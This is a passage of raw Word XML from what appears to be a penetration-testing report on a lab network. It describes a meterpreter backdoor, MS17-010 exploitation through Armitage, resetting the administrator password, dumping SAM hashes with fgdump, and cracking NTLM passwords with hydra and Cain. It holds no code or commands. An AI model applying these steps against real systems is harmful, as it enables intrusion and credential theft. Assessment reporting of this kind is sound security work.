                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2.4.2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="003A1321" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Now that the backdoor is installed, and the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is successfully on the system; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will be used to exploit the targeted machine. </w:t>
      </w:r>
      <w:r w:rsidR="00EB0E11">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Once </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EB0E11">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EB0E11">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> has </w:t>
      </w:r>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>successfully</w:t>
      </w:r>
      <w:r w:rsidR="00EB0E11">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> connected to the system, then through the backdoor that was created, free reign over the targeted machine is given. Things that can be done now include seeing when the user was last available (figure 2.4.3), </w:t>
      </w:r>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>key loggers</w:t>
      </w:r>
      <w:r w:rsidR="00EB0E11">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be installed (figure 2.4.3) and the contents on the webcam can be viewed if there is one. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="640F1869" wp14:editId="32285B2C">
            <wp:extent cx="5131231"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64" t="68249" r="64768" b="14319"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5138629" cy="2212986"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2.4.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRDefault="0043674B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">For the full amount of code used – see </w:t>
      </w:r>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>appendix B.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>MS17-010</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Another way that the system can be exploited is by using the MS17-010 exploit found previously. Using Armitage, it is possible to gain access to the administrator’s command terminal. This will be demonstrated below.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>First thing done in Armitage is the hosts that are to be exploited are entered. In this case 192.168.0.1, and 192.168.0.2.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>From the scanning phase, it was found that the operating systems b</w:t>
      </w:r>
      <w:r w:rsidR="00C3458B">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">eing used is windows 7, so it is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00C3458B">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>entered into</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00C3458B">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Armitage that the servers are running windows 7. After this, the MS17 exploit is called, and executed on the server. From this exploit, access is then given to the command prompt of the targeted servers. This can be seen in figure 2.4.4.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C3458B" w:rsidRDefault="00C3458B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="36758540" wp14:editId="79F6E4EC">
            <wp:extent cx="6205386" cy="34099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67" t="12535" r="801" b="6838"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6216719" cy="3416178"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C3458B" w:rsidRDefault="00C3458B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2.4.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C3458B" w:rsidRDefault="00C3458B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">After gaining access to server, from knowing one of the </w:t>
      </w:r>
      <w:r w:rsidR="002B0FD1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>administrator’s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> username </w:t>
      </w:r>
      <w:r w:rsidR="002B0FD1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>– “</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">administrator”- the password can be changed, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gain access to the administrator</w:t>
      </w:r>
      <w:r w:rsidR="00292E4A">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00292E4A" w:rsidRDefault="00292E4A" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="43B804F2" wp14:editId="3DEECDCF">
            <wp:extent cx="5295900" cy="264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506" t="56410" r="40866" b="5698"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5295900" cy="2647950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00292E4A" w:rsidRDefault="00292E4A" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2.4.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00292E4A" w:rsidRDefault="00292E4A" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>From figure 2.4.5, it is evident that it is possible to change the administrator’s password. After changing the password, it is possible to log in as the administrator.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00782D85" w:rsidRDefault="00782D85" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00782D85" w:rsidRDefault="00782D85" w:rsidP="00782D85">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Password cracking</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00782D85" w:rsidRDefault="00782D85" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">The final step that took place was attempting to crack as many of the </w:t>
      </w:r>
      <w:r w:rsidR="00132909">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>user’s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> passwords as possible without having to change any of the passwords. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRDefault="00782D85" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">The first step that took place was using a tool called hydra in </w:t>
      </w:r>
      <w:r w:rsidR="00132909">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>kali.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> This is a password cracking tool that uses dictionary attacks. </w:t>
      </w:r>
      <w:r w:rsidR="0043674B">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>Some</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the admin usernames that were obtained previously were entered into a text file in Linux. A text file was then imported called “wordlist.txt”, that stored the words used for the dictionary attack. After running this attack, the dictionary attack was unsuccessful, and no passwords returned. </w:t>
      </w:r>
      <w:r w:rsidR="0043674B">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>The results can be seen from this in figure 2.5.1.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043674B" w:rsidRDefault="0043674B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="351BF01B" wp14:editId="0BD71C2C">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-323850</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>285115</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="7180503" cy="1447800"/>
            <wp:effectExtent l="0" t="0" r="190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8115" t="38408" r="288" b="32342"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="7188737" cy="144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3674B" w:rsidRDefault="0043674B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>Figure 2.5.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0038524F" w:rsidRDefault="0043674B" w:rsidP="00782D85">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">The next step was to try and gain the password hashes. </w:t>
      </w:r>
      <w:r w:rsidR="00782D85">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">Due to having access to one of the administrators account – either through the backdoor, or the password change, it was possible to dump </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00782D85">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00782D85">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> the password hashes on the server, from the SAM database.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>Fgdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> was then used to retrieve the password hashes</w:t>
      </w:r>
      <w:r w:rsidR="0038524F">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> form server1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>. See appendix</w:t>
      </w:r>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the results of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>fgdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> tool.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00782D85" w:rsidRDefault="0038524F" w:rsidP="00782D85">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">Now that </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> the passwo</w:t>
      </w:r>
      <w:r w:rsidR="00132909">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>rd hashes have been retrieved, C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">ain will be used to try and crack them. Because the passwords are windows password, they will be NTLM hashes. </w:t>
      </w:r>
      <w:r w:rsidR="0043674B">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>A dictionary attack was again performed against the hashes this time.</w:t>
      </w:r>
      <w:r w:rsidR="002A7605">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> The results of this attack were a lot more extensive than the previous dictionary attack, with 76 out of 127 passwords cracked. The full list of the passwords cracked can be seen in appendix D.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00857EDD" w:rsidRPr="00782D85" w:rsidRDefault="00857EDD" w:rsidP="00782D85">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>In an attempt to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> crack the remaining password, a larger dictionary attack was used. A file called “rockyou.txt” was imported, and attempted to crack more passwords. After 6 hours of running, no new passwords had been cracked, and the attack was only 2% complete. The attack was stopped at this point. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRPr="004D7B3D" w:rsidRDefault="009525A9" w:rsidP="004D7B3D"/>
    <w:p w:rsidR="00D828F5" w:rsidRDefault="00341658" w:rsidP="00865937">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc453256703"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w:rsidR="00493395" w:rsidRDefault="00493395" w:rsidP="00493395">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc453256704"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>General Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="00857EDD" w:rsidP="00857EDD">
      <w:pPr>
        <w:spacing w:after="158"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The results of the attacks on the network were severe. </w:t>
      </w:r>
      <w:r w:rsidR="00507BF0" w:rsidRPr="00507BF0">
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="00507BF0">
        <w:t>oth attempts of trying to break into the system were successful.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> A large amount of the passwords was cracked in addition to gaining access, allowing a potential hacker to do significant damage to the system. Damage that could be done to the system include spying on users, by using a key logger </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> gain more sensitive data such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>uncracked</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> passwords; deleting users accounts; and destroying sensitive data on the system. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="00857EDD" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Further vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00857EDD" w:rsidRPr="00857EDD" w:rsidRDefault="00857EDD" w:rsidP="00857EDD">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Given more time, more of the vulnerabilities that were provided on Nessus would have been exploited. </w:t>
      </w:r>
      <w:r w:rsidR="00EA0256">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
